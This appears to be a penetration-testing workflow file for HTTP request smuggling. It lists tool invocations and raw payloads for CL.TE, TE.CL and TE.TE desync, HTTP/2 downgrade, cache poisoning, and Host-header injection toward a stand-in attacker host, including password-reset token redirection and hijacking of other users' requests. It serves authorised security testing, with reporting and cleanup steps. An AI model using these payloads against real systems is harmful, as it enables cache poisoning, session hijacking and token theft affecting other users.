# Workflows

# HTTP Smuggling Workflows

## Infrastructure reconnaissance

- wappalyzer_detect: url target
- nmap_http_probe: ports "80,443,8080,8443", scripts "http-server-header,http-headers"
- curl_trace: verbose connection analysis
- Identify: reverse proxy vendor, HTTP version support, connection reuse behavior

## CL.TE smuggling detection

- smuggler_scan: url target, method "POST", timeout 5
- Confirm with python_socket_request:
  - Send request with Content-Length covering partial body + Transfer-Encoding: chunked
  - Front-end forwards full CL body, back-end stops at chunk terminator
  - Remaining bytes poison next request in connection
- test_vectors:
  - CL.TE basic: `Content-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED`
  - CL.TE with prefix injection: smuggle `GET /admin HTTP/1.1` as next request
  - Timing-based detection: observe response delay when back-end waits for chunk

## TE.CL smuggling detection

- smuggler_scan: url target, techniques "TE.CL"
- Confirm with python_socket_request:
  - Send chunked body where chunk data exceeds back-end Content-Length interpretation
  - Front-end processes chunks, back-end uses CL and leaves remainder
- test_vectors:
  - TE.CL basic: `Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n`
  - TE.CL with request hijack: capture next user's request via reflected endpoint

## TE.TE obfuscation

- Test Transfer-Encoding header variations that confuse one layer:
  - `Transfer-Encoding: xchunked`
  - `Transfer-Encoding : chunked` (space before colon)
  - `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`
  - `Transfer-Encoding:\tchunked` (tab)
  - `X: x\r\nTransfer-Encoding: chunked` (header injection)
  - `Transfer-Encoding: chunked` with `Content-Length` on same request

## HTTP/2 downgrade attacks

- h2csmuggler_scan: url target, method "POST"
- curl_h2_request: http2_prior_knowledge True
- test_vectors:
  - H2 pseudo-header injection: inject `\r\n` in `:path` or `:authority`
  - CONTINUATION frame abuse: split headers across frames to bypass proxy parsing
  - H2-to-H1 translation: exploit header normalization differences
  - Upgrade header smuggling: `Connection: Upgrade\r\nUpgrade: h2c` on HTTP/1.1

## Cache poisoning via smuggling

- cache_buster_probe: url target, iterations 5
- Workflow:
  1. Identify cacheable endpoint (static resource, public page)
  2. Smuggle request that changes response for cached URL
  3. cache_poison_verify: inject X-Forwarded-Host or smuggled Host header
  4. Verify poisoned response served to other users
- test_vectors:
  - Unkeyed header poisoning: X-Forwarded-Host, X-Original-URL
  - Fat GET smuggling: body in GET request processed by back-end
  - Response queue poisoning: desync response-to-request mapping

## Host header injection (WSTG-INPV-17)

- test_vectors:
  - Duplicate Host headers: `Host: target\r\nHost: attacker`
  - Host override: `X-Forwarded-Host: attacker`, `X-Host: attacker`
  - Absolute URL with different Host: `GET http://attacker/ HTTP/1.1\r\nHost: target`
  - Port injection: `Host: target:@attacker`
  - Password reset poisoning: trigger reset, inject Host to redirect token
- Impact validation: capture password reset links, demonstrate SSRF via routing

## Reporting and validation

- Document desync type (CL.TE, TE.CL, TE.TE, H2) with raw request/response pairs
- Record cache poisoning duration and affected URLs
- cdn_purge: clean up poisoned caches after testing
- Classify severity: request hijacking (Critical), cache poisoning (High), header injection (Medium)
